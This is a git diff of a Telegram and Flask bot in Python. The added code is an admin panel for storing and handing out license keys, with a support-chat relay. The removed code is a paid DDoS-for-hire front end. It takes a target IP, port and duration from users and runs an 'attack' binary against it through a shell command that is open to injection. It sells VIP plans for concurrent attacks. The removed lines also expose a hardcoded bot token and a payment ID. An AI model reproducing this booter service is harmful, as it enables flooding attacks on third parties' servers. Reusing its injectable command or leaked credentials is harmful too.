@@ -3,14 +3,7 @@ import re
 import threading
 import time
 import json
-import datetime
-import subprocess
-import random
-import string
-import logging
-import urllib.parse
-import socket
-import struct
+import queue
 
 from flask import Flask, request, jsonify, Response
 import telebot
@@ -18,45 +11,47 @@ from telebot import types
 from pymongo import MongoClient, ASCENDING, DESCENDING
 from pymongo.errors import DuplicateKeyError
 
+
 # ============================================================
-# CONFIGURATION & LOGGING
+# CONFIGURATION
 # ============================================================
 
-logging.basicConfig(filename='bot.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
-
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "6400615750:AAHero6NP7UImczIeqmVL76yh4zw2tP893s")
+TOKEN = os.environ.get("BOT_TOKEN")
 MONGODB_URI = os.environ.get("MONGODB_URI")
-UPI_ID = os.environ.get("UPI_ID", "r2frsyt@ptyes")
+RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://r2fsunilyt-1.onrender.com")
 
-if not BOT_TOKEN:
+if not TOKEN:
     raise ValueError("BOT_TOKEN environment variable is not set")
 
 if not MONGODB_URI:
     raise ValueError("MONGODB_URI environment variable is not set")
 
-OWNER_ID = "6795305850"
-ADMIN_IDS = ["6795305850"]
+ADMIN_ID = 6795305850
+OWNER_USERNAME = "R2FSUNILYT"
 
-bot = telebot.TeleBot(BOT_TOKEN)
-app = Flask(__name__)
+bot = telebot.TeleBot(TOKEN)
 
-# User state & active attack tracking
-user_states = {}
-active_attacks = set()
-active_targets = set()
-attacks_lock = threading.Lock()
+UPLOAD_FOLDER = 'static/uploads'
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
-# Flask Health Check Route for Render
-@app.route('/')
-def index():
-    return "R2F BOT IS ACTIVE AND RUNNING SUCCESSFULLY! 🚀", 200
+# Thread-safe client streams dictionary for Real-Time 0-delay messaging
+client_queues = {}
+queues_lock = threading.Lock()
 
-@app.route('/health')
-def health():
-    return jsonify({"status": "HEALTHY"}), 200
+def broadcast_message(device_id, message_data):
+    """Instantly pushes the message to any active live stream connection of the given device_id"""
+    with queues_lock:
+        if device_id in client_queues:
+            json_str = json.dumps(message_data)
+            for q in client_queues[device_id]:
+                try:
+                    q.put(json_str)
+                except Exception:
+                    pass
+
 
 # ============================================================
-# MONGODB DATABASE SETUP
+# MONGODB DATABASE
 # ============================================================
 
 try:
@@ -66,27 +61,75 @@ try:
         connectTimeoutMS=10000,
         socketTimeoutMS=10000,
     )
+
     mongo_client.admin.command("ping")
-    db = mongo_client["r2f_bot_db"]
 
-    users_collection = db["allowed_users"]
-    admins_collection = db["admins"]
-    credits_collection = db["user_credits"]
-    gift_codes_collection = db["gift_codes"]
-    key_prices_collection = db["key_prices"]
-    logs_collection = db["command_logs"]
+    db = mongo_client["r2f_bot"]
 
-    users_collection.create_index([("user_id", ASCENDING)], unique=True)
-    gift_codes_collection.create_index([("code", ASCENDING)], unique=True)
-    key_prices_collection.create_index([("duration", ASCENDING)], unique=True)
+    keys_collection = db["keys_table"]
+    counters_collection = db["counters"]
+    payments_collection = db["payments_table"]
+    device_cooldowns_collection = db["device_cooldowns"]
+    chats_collection = db["chats"]
 
-    print("MongoDB connected successfully with Multi-User & Render support!")
+    keys_collection.create_index(
+        [("license_key", ASCENDING)],
+        unique=True,
+        name="unique_license_key",
+    )
+
+    keys_collection.create_index(
+        [("duration", ASCENDING), ("status", ASCENDING)]
+    )
+
+    keys_collection.create_index(
+        [("assigned_to", ASCENDING), ("status", ASCENDING)]
+    )
+
+    payments_collection.create_index(
+        [("utr", ASCENDING)],
+        unique=True
+    )
+
+    device_cooldowns_collection.create_index(
+        [("device_id", ASCENDING)],
+        unique=True
+    )
+
+    chats_collection.create_index(
+        [("device_id", ASCENDING), ("timestamp", ASCENDING)],
+        name="device_chat_timestamp"
+    )
+
+    print("MongoDB connected successfully with Real-Time Chat & Media Support!")
 
 except Exception as e:
     raise RuntimeError(f"MongoDB connection failed: {e}")
 
+
 # ============================================================
-# KEYBOARDS & MENUS (ALL CAPS)
+# MONGODB AUTO INTEGER ID
+# ============================================================
+
+def get_next_id(sequence_name):
+    result = counters_collection.find_one_and_update(
+        {"_id": sequence_name},
+        {"$inc": {"seq": 1}},
+        upsert=True,
+        return_document=True,
+    )
+    return result["seq"]
+
+
+# ============================================================
+# USER STATE
+# ============================================================
+
+user_states = {}
+
+
+# ============================================================
+# KEYBOARDS (BOTTOM REPLY MENU)
 # ============================================================
 
 def get_main_reply_keyboard():
@@ -94,651 +137,1212 @@ def get_main_reply_keyboard():
         resize_keyboard=True,
         row_width=2
     )
+
     markup.add(
-        types.KeyboardButton("⚡ QUICK ATTACK"),
-        types.KeyboardButton("💎 BUY VIP"),
-        types.KeyboardButton("💰 CHECK BALANCE"),
-        types.KeyboardButton("📅 DAILY CHECK-IN"),
-        types.KeyboardButton("🔗 REFER & EARN"),
-        types.KeyboardButton("⚠️ RULES"),
-        types.KeyboardButton("🛠️ HELP")
+        types.KeyboardButton("🔑 GENERATE KEY"),
+        types.KeyboardButton("📊 CHECK STOCK")
     )
+
+    markup.add(
+        types.KeyboardButton("➕ ADD SINGLE"),
+        types.KeyboardButton("📦 ADD BULK")
+    )
+
+    markup.add(
+        types.KeyboardButton("🗑️ DELETE KEY"),
+        types.KeyboardButton("📋 SHOW SOLD KEY")
+    )
+
     return markup
 
-def get_help_inline_keyboard():
+
+def get_back_reply_keyboard():
+    markup = types.ReplyKeyboardMarkup(
+        resize_keyboard=True,
+        row_width=1
+    )
+
+    markup.add(
+        types.KeyboardButton("🔚 BACK")
+    )
+
+    return markup
+
+
+# ============================================================
+# SET BOT COMMANDS (MENU BUTTON SETUP)
+# ============================================================
+
+def setup_bot_commands():
+    commands = [
+        types.BotCommand("start", "Open Control Panel / Support"),
+        types.BotCommand("generate", "Generate Key Shortcut"),
+        types.BotCommand("stock", "Check Stock Shortcut"),
+        types.BotCommand("addsingle", "Add Single Key Shortcut"),
+        types.BotCommand("addbulk", "Add Bulk Keys Shortcut"),
+        types.BotCommand("delete", "Delete Key Options"),
+        types.BotCommand("sold", "View Sold Keys")
+    ]
+    try:
+        bot.set_my_commands(commands)
+    except Exception as e:
+        print("Failed to set bot commands:", e)
+
+
+# ============================================================
+# START & SHORTCUT COMMANDS
+# ============================================================
+
+@bot.message_handler(commands=["start", "generate", "stock", "addsingle", "addbulk", "delete", "sold"])
+def handle_commands(message):
+    user_id = message.from_user.id
+
+    if user_id != ADMIN_ID:
+        bot.reply_to(
+            message,
+            "👋 Welcome!\n\nAap apni koi bhi query ya message yahan send kar sakte hain, jo seedha Admin tak pahunch jayegi."
+        )
+        return
+
+    cmd = message.text.split()[0].lower()
+
+    if user_id in user_states:
+        del user_states[user_id]
+
+    if cmd == "/start":
+        welcome_text = (
+            "👑 *SUPER ADMIN CONTROL PANEL*\n\n"
+            "Niche diye gaye options select karein:"
+        )
+        bot.send_message(
+            message.chat.id,
+            welcome_text,
+            parse_mode="Markdown",
+            reply_markup=get_main_reply_keyboard(),
+        )
+    elif cmd == "/generate":
+        handle_generate_key_menu_direct(message)
+    elif cmd == "/stock":
+        handle_all_key_stock_direct(message)
+    elif cmd == "/addsingle":
+        handle_add_single_menu_direct(message)
+    elif cmd == "/addbulk":
+        handle_add_bulk_menu_direct(message)
+    elif cmd == "/delete":
+        handle_delete_key_menu_direct(message)
+    elif cmd == "/sold":
+        handle_show_sold_key_direct(message)
+
+
+# ============================================================
+# BACK BUTTON
+# ============================================================
+
+@bot.message_handler(func=lambda message: message.text == "🔚 BACK")
+def handle_back_button(message):
+    user_id = message.from_user.id
+
+    if user_id != ADMIN_ID:
+        return
+
+    if user_id in user_states:
+        msg_id = user_states[user_id].get("response_msg_id")
+        if msg_id:
+            try:
+                bot.delete_message(message.chat.id, msg_id)
+            except Exception:
+                pass
+        del user_states[user_id]
+
+    try:
+        bot.delete_message(message.chat.id, message.message_id)
+    except Exception:
+        pass
+
+    bot.send_message(
+        message.chat.id,
+        "👑 *SUPER ADMIN CONTROL PANEL*\n\n"
+        "Niche diye gaye options select karein:",
+        parse_mode="Markdown",
+        reply_markup=get_main_reply_keyboard(),
+    )
+
+
+# ============================================================
+# TEXT MESSAGE HANDLERS FOR BOTTOM MENU BUTTONS
+# ============================================================
+
+@bot.message_handler(func=lambda message: message.text == "🔑 GENERATE KEY")
+def handle_gen_key_msg(message):
+    handle_generate_key_menu_direct(message)
+
+@bot.message_handler(func=lambda message: message.text == "📊 CHECK STOCK")
+def handle_check_stock_msg(message):
+    handle_all_key_stock_direct(message)
+
+@bot.message_handler(func=lambda message: message.text == "➕ ADD SINGLE")
+def handle_add_single_msg(message):
+    handle_add_single_menu_direct(message)
+
+@bot.message_handler(func=lambda message: message.text == "📦 ADD BULK")
+def handle_add_bulk_msg(message):
+    handle_add_bulk_menu_direct(message)
+
+@bot.message_handler(func=lambda message: message.text == "🗑️ DELETE KEY")
+def handle_del_key_msg(message):
+    handle_delete_key_menu_direct(message)
+
+@bot.message_handler(func=lambda message: message.text == "📋 SHOW SOLD KEY")
+def handle_sold_key_msg(message):
+    handle_show_sold_key_direct(message)
+
+
+# ============================================================
+# USER SUPPORT MESSAGE & ADMIN REPLY SYSTEM (ROBUST)
+# ============================================================
+
+@bot.message_handler(func=lambda message: message.from_user.id != ADMIN_ID)
+def handle_user_messages(message):
+    user_id = message.from_user.id
+    user_name = message.from_user.first_name or "User"
+    username = f"@{message.from_user.username}" if message.from_user.username else "No Username"
+
+    admin_msg = (
+        f"💬 *NEW MESSAGE FROM USER*\n\n"
+        f"👤 *Name:* {user_name}\n"
+        f"🔗 *Username:* {username}\n"
+        f"🆔 *User ID:* `{user_id}`\n\n"
+        f"📝 *Message:*\n{message.text}"
+    )
+
+    try:
+        bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
+        bot.reply_to(message, "✅ Aapka message admin ko bhej diya gaya hai. Jald hi aapko reply milega!")
+    except Exception as e:
+        print(f"Error forwarding message to admin: {e}")
+        bot.reply_to(message, "❌ Message send karne mein error aayi. Kripya baad mein try karein.")
+
+
+@bot.message_handler(func=lambda message: message.from_user.id == ADMIN_ID and message.reply_to_message)
+def handle_admin_reply_to_user(message):
+    reply_text = message.reply_to_message.text or message.reply_to_message.caption
+    if not reply_text:
+        return
+
+    if "NEW MESSAGE FROM USER" in reply_text:
+        match = re.search(r"User\s*ID[^\d]*(\d+)", reply_text, re.IGNORECASE)
+        if match:
+            target_user_id = int(match.group(1))
+            admin_reply = message.text
+
+            try:
+                bot.send_message(
+                    target_user_id,
+                    f"💬 *Message from Admin:*\n\n{admin_reply}",
+                    parse_mode="Markdown"
+                )
+                bot.reply_to(message, "✅ Reply successfully user ko bhej diya gaya hai!", reply_markup=get_main_reply_keyboard())
+            except Exception as e:
+                bot.reply_to(message, f"❌ User ko message bhejne mein error aayi: {e}", reply_markup=get_main_reply_keyboard())
+        else:
+            bot.reply_to(message, "❌ Is message se User ID detect nahi ho payi.", reply_markup=get_main_reply_keyboard())
+
+    elif "NEW CHAT FROM APP" in reply_text or "Media from Device" in reply_text:
+        match = re.search(r"Device\s*ID[^\w]*([a-zA-Z0-9_.-]+)", reply_text, re.IGNORECASE) or re.search(r"Device[^\w]*([a-zA-Z0-9_.-]+)", reply_text, re.IGNORECASE)
+        if match:
+            device_id = match.group(1)
+            admin_reply = message.text
+
+            chats_collection.insert_one({
+                "device_id": device_id,
+                "sender": "admin",
+                "message": admin_reply,
+                "media_url": "",
+                "timestamp": time.time()
+            })
+
+            broadcast_message(device_id, {
+                "sender": "admin",
+                "message": admin_reply,
+                "media_url": ""
+            })
+
+            try:
+                bot.reply_to(message, f"✅ App chat reply successfully delivered instantly to device: `{device_id}`", parse_mode="Markdown", reply_markup=get_main_reply_keyboard())
+            except Exception as e:
+                bot.reply_to(message, f"❌ Error: {e}", reply_markup=get_main_reply_keyboard())
+        else:
+            bot.reply_to(message, "❌ Is message se Device ID detect nahi ho payi.", reply_markup=get_main_reply_keyboard())
+
+
+# ============================================================
+# 1. GENERATE KEY HANDLER
+# ============================================================
+
+def handle_generate_key_menu_direct(message):
+    user_id = message.from_user.id
+    if user_id != ADMIN_ID:
+        return
+
     markup = types.InlineKeyboardMarkup(row_width=2)
-    markup.add(
-        types.InlineKeyboardButton("📞 CONTACT SUPPORT", callback_data="help_support"),
-        types.InlineKeyboardButton("📖 HOW TO USE", callback_data="help_how_to_use"),
-        types.InlineKeyboardButton("⬅️ BACK TO MENU", callback_data="back_to_main")
-    )
-    return markup
+    durations = ["5 Hour", "1 Day", "7 Day", "30 Day"]
 
-def get_vip_plans_keyboard():
+    for d in durations:
+        cb_val = d.replace(" ", "_")
+        stock_count = keys_collection.count_documents({"duration": d, "status": "unused"})
+        markup.add(
+            types.InlineKeyboardButton(
+                f"{d} (Stock: {stock_count})",
+                callback_data=f"gen_dur_{cb_val}"
+            )
+        )
+
+    sent_msg = bot.send_message(
+        message.chat.id,
+        "🔑 *GENERATE KEY*\n\n"
+        "Duration select karein:",
+        parse_mode="Markdown",
+        reply_markup=markup,
+    )
+    user_states[user_id] = {"response_msg_id": sent_msg.message_id}
+
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("gen_dur_"))
+def callback_generate_key_duration(call):
+    if call.from_user.id != ADMIN_ID:
+        bot.answer_callback_query(call.id, "❌ Unauthorized!", show_alert=True)
+        return
+
+    duration = call.data.replace("gen_dur_", "").replace("_", " ")
+    stock_count = keys_collection.count_documents({"duration": duration, "status": "unused"})
+
     markup = types.InlineKeyboardMarkup(row_width=1)
     markup.add(
-        types.InlineKeyboardButton("🌟 WEEK VIP (7 DAYS) - ₹499", callback_data="vip_week"),
-        types.InlineKeyboardButton("🔥 MONTH VIP (30 DAYS) - ₹799", callback_data="vip_month"),
-        types.InlineKeyboardButton("⬅️ BACK TO MENU", callback_data="back_to_main")
+        types.InlineKeyboardButton(f"📥 Get Key ({duration})", callback_data=f"get_key_{call.data.replace('gen_dur_', '')}")
     )
-    return markup
 
-def get_qr_action_keyboard():
-    markup = types.InlineKeyboardMarkup(row_width=2)
-    markup.add(
-        types.InlineKeyboardButton("✅ VERIFY", callback_data="vip_verify"),
-        types.InlineKeyboardButton("❌ CANCEL ORDER", callback_data="vip_cancel")
-    )
-    return markup
-
-# ============================================================
-# HELPER FUNCTIONS
-# ============================================================
-
-def get_current_time():
-    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
-def is_user_allowed(user_id):
-    if str(user_id) == OWNER_ID or str(user_id) in ADMIN_IDS:
-        return True
-    user = users_collection.find_one({"user_id": str(user_id)})
-    if user:
-        if "expiration" in user and user["expiration"]:
-            if datetime.datetime.now() > user["expiration"]:
-                return False
-        return True
-    return False
-
-def log_command_db(user_id, target, port, duration):
-    try:
-        user_info = bot.get_chat(int(user_id))
-        username = "@" + user_info.username if user_info.username else f"USERID: {user_id}"
-    except Exception:
-        username = f"USERID: {user_id}"
-    
-    logs_collection.insert_one({
-        "user_id": str(user_id),
-        "username": username,
-        "target": target,
-        "port": port,
-        "duration": duration,
-        "timestamp": datetime.datetime.now()
-    })
-
-def execute_attack(chat_id, user_id, target, port, attack_time):
-    if attack_time > 500:
-        bot.send_message(chat_id, "ERROR: ATTACK TIME CANNOT EXCEED 500 SECONDS.")
-        with attacks_lock:
-            active_attacks.discard((user_id, target))
-            active_targets.discard(target)
-        return
-
-    log_command_db(user_id, target, port, attack_time)
-    
-    start_resp = f"R2F POWER START 🚀\n\n🗿 𝐓𝐀𝐑𝐆𝐄ْت: {target}:{port}\n🕦 ATTACK DURATION: {attack_time}S\n💣 METHOD: BGMI HIGH-POWER BINARY\n\n🔥 STATUS: IN PROGRESS... 🔥"
-    bot.send_message(chat_id, start_resp)
-    
-    # Executing compiled binary matching usage: ./attack <ip> <port> <time> <threads>[span_1](start_span)[span_1](end_span)
-    try:
-        if os.path.exists("attack"):
-            os.chmod("attack", 0o755)
-        else:
-            logging.error("CRITICAL ERROR: 'attack' binary file not found!")
-            bot.send_message(chat_id, "❌ ERROR: 'attack' BINARY FILE NOT FOUND ON SERVER!")
-            with attacks_lock:
-                active_attacks.discard((user_id, target))
-                active_targets.discard(target)
-            return
-
-        full_command = f"./attack {target} {port} {attack_time} 300"
-        subprocess.run(full_command, shell=True, timeout=attack_time + 5)
-    except subprocess.TimeoutExpired:
-        pass
-    except Exception as e:
-        logging.error(f"Binary Execution Error: {e}")
-    
-    with attacks_lock:
-        active_attacks.discard((user_id, target))
-        active_targets.discard(target)
-    
-    bot.send_message(chat_id, f"BGMI ATTACK FINISHED ✅.\nTARGET: {target} | PORT: {port} | TIME: {attack_time}S")
-
-def try_start_attack(chat_id, user_id, target, port, attack_time):
-    if not is_user_allowed(user_id):
-        bot.send_message(chat_id, "🚫 UNAUTHORIZED ACCESS!\n\nAAPKE PAAS ATTACK CHALANE KI PERMISSION NAHI HAI. KRIPYA VIP PURCHASE KAREIN.")
-        return
-
-    with attacks_lock:
-        is_vip_or_admin = (str(user_id) == OWNER_ID or str(user_id) in ADMIN_IDS or users_collection.find_one({"user_id": str(user_id), "is_vip": True}))
-        
-        user_active_count = sum(1 for u, t in active_attacks if u == user_id)
-        if not is_vip_or_admin and user_active_count >= 1:
-            bot.send_message(chat_id, "⚠️ **RULE VIOLATION:** AAPKA EK ATTACK PEHLE SE CHAL RAHA HAI! VIP USER BANNE KE LIYE '💎 BUY VIP' PAR CLICK KAREIN.", parse_mode="Markdown")
-            return
-
-        if target in active_targets:
-            bot.send_message(chat_id, f"⚠️ **TARGET BUSY:** IS IP ({target}) PAR PEHLE SE EK ATTACK CHAL RAHA HAI!", parse_mode="Markdown")
-            return
-
-        if not is_vip_or_admin:
-            user_data = users_collection.find_one({"user_id": str(user_id)}) or {}
-            free_attacks = user_data.get("free_attacks", 5)
-            cred_data = credits_collection.find_one({"user_id": str(user_id)}) or {"balance": 0}
-            balance = cred_data.get("balance", 0)
-
-            if free_attacks > 0:
-                users_collection.update_one({"user_id": str(user_id)}, {"$inc": {"free_attacks": -1}}, upsert=True)
-            elif balance >= 15:
-                credits_collection.update_one({"user_id": str(user_id)}, {"$inc": {"balance": -15}}, upsert=True)
-            else:
-                bot.send_message(chat_id, "❌ **INSUFFICIENT BALANCE!** FREE ATTACKS KHATAM HO CHUKE HAIN. 💎 BUY VIP OPTION SE VIP PLAN LEIN.", parse_mode="Markdown")
-                return
-
-        active_attacks.add((user_id, target))
-        active_targets.add(target)
-    
-    threading.Thread(target=execute_attack, args=(chat_id, user_id, target, port, attack_time), daemon=True).start()
-
-# ============================================================
-# TELEBOT HANDLERS (ALL CAPS)
-# ============================================================
-
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    args = message.text.split()
-    user_id = str(message.chat.id)
-    
-    if len(args) > 1 and args[1].startswith("ref_"):
-        referrer_id = args[1].replace("ref_", "")
-        if referrer_id != user_id:
-            existing = users_collection.find_one({"user_id": user_id})
-            if not existing:
-                credits_collection.update_one(
-                    {"user_id": referrer_id},
-                    {"$inc": {"balance": 10}},
-                    upsert=True
-                )
-                try:
-                    bot.send_message(int(referrer_id), "🎁 REFERRAL SUCCESS! EK NAYE USER NE AAPKI LINK SE JOIN KIYA HAI. AAPKO +10 COINS MILE HAIN!")
-                except Exception:
-                    pass
-
-    response = (
-        f"WELCOME TO R2FSUNILYT MAIN MENU\n\n"
-        f"🕒 CURRENT TIME: `{get_current_time()}`\n\n"
-        "NICHE DIYE GAYE BUTTONS YA OPTIONS KA USE KAREIN:"
-    )
-    bot.send_message(message.chat.id, response, parse_mode="Markdown", reply_markup=get_main_reply_keyboard())
-
-@bot.callback_query_handler(func=lambda call: call.data == "back_to_main")
-def back_to_main_menu(call):
     bot.answer_callback_query(call.id)
-    try:
-        bot.delete_message(call.message.chat.id, call.message.message_id)
-    except Exception:
-        pass
+    bot.edit_message_text(
+        f"🔑 *Duration Selected:* `{duration}`\n"
+        f"📦 *Available Stock:* `{stock_count}`\n\n"
+        f"Niche diye gaye button par click karke key prapt karein:",
+        call.message.chat.id,
+        call.message.message_id,
+        parse_mode="Markdown",
+        reply_markup=markup
+    )
+
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("get_key_"))
+def callback_get_key_final(call):
+    if call.from_user.id != ADMIN_ID:
+        bot.answer_callback_query(call.id, "❌ Unauthorized!", show_alert=True)
+        return
+
+    duration = call.data.replace("get_key_", "").replace("_", " ")
+    user_id = call.from_user.id
+
+    key_row = keys_collection.find_one(
+        {"duration": duration, "status": "unused"},
+        {"id": 1, "license_key": 1}
+    )
+
+    if not key_row:
+        bot.answer_callback_query(
+            call.id,
+            f"❌ {duration} ki koi key available nahi hai (Out of Stock)!",
+            show_alert=True
+        )
+        return
+
+    key_id = key_row["id"]
+    license_key = key_row["license_key"]
+
+    assigned_key = keys_collection.find_one_and_update(
+        {"id": key_id, "status": "unused"},
+        {"$set": {"status": "used", "assigned_to": user_id}},
+        return_document=True
+    )
+
+    if not assigned_key:
+        bot.answer_callback_query(
+            call.id,
+            "❌ Key pehle hi assign ho chuki hai, dubara try karein.",
+            show_alert=True
+        )
+        return
+
+    bot.answer_callback_query(call.id, "Key Generated Successfully!")
     bot.send_message(
-        call.message.chat.id, 
-        "WELCOME TO R2FSUNILYT MAIN MENU", 
-        parse_mode="Markdown", 
+        call.message.chat.id,
+        f"✅ *KEY GENERATED SUCCESSFULLY!*\n\n"
+        f"• *Duration:* {duration}\n"
+        f"• *License Key:* `{license_key}`",
+        parse_mode="Markdown",
         reply_markup=get_main_reply_keyboard()
     )
 
-@bot.message_handler(func=lambda message: message.text == "⚡ QUICK ATTACK")
-def quick_attack_prompt(message):
-    user_id = str(message.chat.id)
-    if not is_user_allowed(user_id):
-        bot.send_message(message.chat.id, "🚫 UNAUTHORIZED ACCESS! VIP PLAN LENE KE LIYE '💎 BUY VIP' PAR CLICK KAREIN.")
+
+# ============================================================
+# 2. CHECK STOCK HANDLER
+# ============================================================
+
+def handle_all_key_stock_direct(message):
+    user_id = message.from_user.id
+    if user_id != ADMIN_ID:
         return
 
-    user_states[user_id] = {"action": "waiting_quick_attack_input"}
-    bot.send_message(
+    durations = ["5 Hour", "1 Day", "7 Day", "30 Day"]
+    text = "📊 *AVAILABLE KEY STOCK SUMMARY:*\n\n"
+
+    for d in durations:
+        unused_count = keys_collection.count_documents({"duration": d, "status": "unused"})
+        text += f"• *{d}:* `{unused_count}` keys available\n"
+
+    total_unused = keys_collection.count_documents({"status": "unused"})
+    total_used = keys_collection.count_documents({"status": "used"})
+
+    text += f"\n🟢 *Total Unused Stock:* `{total_unused}`\n"
+    text += f"🔴 *Total Used Keys:* `{total_used}`"
+
+    sent_msg = bot.send_message(
         message.chat.id,
-        "⚡ *QUICK ATTACK PANEL*\n\n"
-        "APNA **TARGET IP, PORT, AUR TIME** EK SATH SPACE DEKAR SEND KAREIN.\n"
-        "👉 *EXAMPLE:* `192.168.1.1 80 300`\n\n"
-        "(MAX TIME ALLOWED: 500 SECONDS)",
+        text,
+        parse_mode="Markdown",
+        reply_markup=get_main_reply_keyboard(),
+    )
+    user_states[user_id] = {"response_msg_id": sent_msg.message_id}
+
+
+# ============================================================
+# 3. ADD SINGLE HANDLER
+# ============================================================
+
+def handle_add_single_menu_direct(message):
+    user_id = message.from_user.id
+    if user_id != ADMIN_ID:
+        return
+
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    durations = ["5 Hour", "1 Day", "7 Day", "30 Day"]
+
+    for d in durations:
+        cb_val = d.replace(" ", "_")
+        markup.add(
+            types.InlineKeyboardButton(
+                f"➕ Add Single ({d})",
+                callback_data=f"add_single_dur_{cb_val}"
+            )
+        )
+
+    sent_msg = bot.send_message(
+        message.chat.id,
+        "➕ *ADD SINGLE KEY*\n\n"
+        "Duration select karein:",
+        parse_mode="Markdown",
+        reply_markup=markup,
+    )
+    user_states[user_id] = {"response_msg_id": sent_msg.message_id}
+
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("add_single_dur_"))
+def callback_add_single_dur(call):
+    if call.from_user.id != ADMIN_ID:
+        return
+    duration = call.data.replace("add_single_dur_", "").replace("_", " ")
+    user_id = call.from_user.id
+    user_states[user_id] = {
+        "type": "waiting_add_single_key",
+        "duration": duration,
+        "response_msg_id": call.message.message_id
+    }
+    bot.answer_callback_query(call.id)
+    bot.edit_message_text(
+        f"💬 Selected Duration: *{duration}*\n\nAb apni **License Key** yahan send karein:",
+        call.message.chat.id,
+        call.message.message_id,
         parse_mode="Markdown"
     )
 
-@bot.message_handler(func=lambda message: str(message.chat.id) in user_states and user_states[str(message.chat.id)].get("action") == "waiting_quick_attack_input")
-def process_quick_attack_input(message):
-    user_id = str(message.chat.id)
-    state = user_states.pop(user_id, None)
-    if not state:
+
+# ============================================================
+# 4. ADD BULK HANDLER
+# ============================================================
+
+def handle_add_bulk_menu_direct(message):
+    user_id = message.from_user.id
+    if user_id != ADMIN_ID:
         return
 
-    parts = message.text.strip().split()
-    if len(parts) == 3:
-        target = parts[0]
-        try:
-            port = int(parts[1])
-            attack_time = int(parts[2])
-        except ValueError:
-            bot.reply_to(message, "❌ INVALID PORT OR TIME FORMAT. DOBARA TRY KAREIN.")
-            return
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    durations = ["5 Hour", "1 Day", "7 Day", "30 Day"]
 
-        if attack_time > 500:
-            bot.reply_to(message, "❌ MAX ATTACK TIME 500 SECONDS HAI.")
-            return
+    for d in durations:
+        cb_val = d.replace(" ", "_")
+        markup.add(
+            types.InlineKeyboardButton(
+                f"📦 Add Bulk ({d})",
+                callback_data=f"add_bulk_dur_{cb_val}"
+            )
+        )
 
-        try_start_attack(message.chat.id, user_id, target, port, attack_time)
-    else:
-        bot.reply_to(message, "❌ GALAT FORMAT! KRIPYA IP, PORT, AUR TIME SPACE DEKAR DEIN (JAISE: `192.168.1.1 80 300`)", parse_mode="Markdown")
-
-@bot.message_handler(func=lambda message: message.text == "💎 BUY VIP")
-def buy_vip_menu(message):
-    response = (
-        "💎 **R2F VIP SUBSCRIPTION PLANS**\n\n"
-        "🌟 **WEEK VIP (7 DAYS):** ₹499\n"
-        "   • UNLIMITED ACCESS\n"
-        "   • MULTIPLE CONCURRENT ATTACKS\n\n"
-        "🔥 **MONTH VIP (30 DAYS):** ₹799\n"
-        "   • UNLIMITED ACCESS\n"
-        "   • MULTIPLE CONCURRENT ATTACKS\n\n"
-        "NICHE DIYE GAYE PLAN PAR CLICK KAREIN:"
+    sent_msg = bot.send_message(
+        message.chat.id,
+        "📦 *ADD BULK KEYS*\n\n"
+        "Duration select karein:",
+        parse_mode="Markdown",
+        reply_markup=markup,
     )
-    bot.send_message(message.chat.id, response, parse_mode="Markdown", reply_markup=get_vip_plans_keyboard())
+    user_states[user_id] = {"response_msg_id": sent_msg.message_id}
 
-@bot.callback_query_handler(func=lambda call: call.data in ["vip_week", "vip_month"])
-def vip_plan_selected(call):
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("add_bulk_dur_"))
+def callback_add_bulk_dur(call):
+    if call.from_user.id != ADMIN_ID:
+        return
+    duration = call.data.replace("add_bulk_dur_", "").replace("_", " ")
+    user_id = call.from_user.id
+    user_states[user_id] = {
+        "type": "waiting_add_bulk_keys",
+        "duration": duration,
+        "response_msg_id": call.message.message_id
+    }
     bot.answer_callback_query(call.id)
-    user_id = str(call.message.chat.id)
-    chat_id = call.message.chat.id
-    
-    try:
-        bot.delete_message(chat_id, call.message.message_id)
-    except Exception:
-        pass
-
-    duration = "week" if call.data == "vip_week" else "month"
-    amount = 499 if duration == "week" else 799
-    days = 7 if duration == "week" else 30
-
-    upi_url = f"upi://pay?pa={UPI_ID}&pn=R2F_BOT&am={amount}&cu=INR"
-    qr_image_url = f"https://api.qrserver.com/v1/create-qr-code/?size=350x350&data={urllib.parse.quote(upi_url)}"
-
-    caption = (
-        f"💎 **@R2FSUNILYT OWNER OF R2FOFFICIAL** 🛡️\n\n"
-        f"📦 **PLAN:** {duration.upper()} VIP ({days} DAYS)\n"
-        f"💵 **AMOUNT:** ₹{amount}\n"
-        f"🆔 **UPI ID:** `{UPI_ID}`\n\n"
-        "⚠️ *YE QR CODE SIRF 5 MINUTES KE LIYE VALID HAI!* USKE BAAD AUTOMATIC DELETE HO JAYEGA.\n"
-        "1. SCAN KARKE PAYMENT KAREIN.\n"
-        "2. PAYMENT SCREENSHOT SEND KAREIN PHIR 'VERIFY' PAR CLICK KAREIN."
+    bot.edit_message_text(
+        f"💬 Selected Duration: *{duration}*\n\nAb multiple keys **ek line mein ek key** karke yahan send/paste karein:",
+        call.message.chat.id,
+        call.message.message_id,
+        parse_mode="Markdown"
     )
 
-    try:
-        sent_msg = bot.send_photo(
-            chat_id, 
-            qr_image_url, 
-            caption=caption, 
-            parse_mode="Markdown", 
-            reply_markup=get_qr_action_keyboard()
+
+# ============================================================
+# 5. DELETE KEY HANDLER & OPTIONS
+# ============================================================
+
+def handle_delete_key_menu_direct(message):
+    user_id = message.from_user.id
+    if user_id != ADMIN_ID:
+        return
+
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    markup.add(
+        types.InlineKeyboardButton("🗑️ Single Delete", callback_data="del_single_menu"),
+        types.InlineKeyboardButton("🗑️ Delete Sold Keys", callback_data="del_sold_menu_main"),
+        types.InlineKeyboardButton("🗑️ Delete All", callback_data="del_all_menu_main"),
+    )
+
+    sent_msg = bot.send_message(
+        message.chat.id,
+        "🗑️ *DELETE STOCK OPTIONS*\n\n"
+        "Niche diye gaye options mein se select karein:",
+        parse_mode="Markdown",
+        reply_markup=markup,
+    )
+    user_states[user_id] = {"response_msg_id": sent_msg.message_id}
+
+
